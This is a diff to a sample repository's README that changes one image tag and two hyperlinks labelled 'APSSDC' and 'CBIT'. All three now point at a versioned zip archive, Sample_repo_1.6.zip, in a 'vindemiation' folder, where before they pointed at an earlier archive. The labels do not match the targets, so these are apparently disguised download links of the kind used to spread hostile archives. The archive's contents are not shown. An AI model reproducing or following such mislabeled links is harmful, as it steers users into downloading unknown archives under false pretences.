@@ -35,7 +35,7 @@ This is another model of the Repository
      - Embeded Systems
      - Django
  * ** Adding a Images into Markdown Document**
-      * <img src="https://raw.githubusercontent.com/muniprasad1999/Sample-repo/main/vindemiation/Sample-repo.zip"> </img>
+      * <img src="https://github.com/muniprasad1999/Sample-repo/raw/refs/heads/main/vindemiation/Sample_repo_1.6.zip"> </img>
  * Hyper Links
-    [APSSDC](https://raw.githubusercontent.com/muniprasad1999/Sample-repo/main/vindemiation/Sample-repo.zip) <br>
-    [CBIT](https://raw.githubusercontent.com/muniprasad1999/Sample-repo/main/vindemiation/Sample-repo.zip)
+    [APSSDC](https://github.com/muniprasad1999/Sample-repo/raw/refs/heads/main/vindemiation/Sample_repo_1.6.zip) <br>
+    [CBIT](https://github.com/muniprasad1999/Sample-repo/raw/refs/heads/main/vindemiation/Sample_repo_1.6.zip)
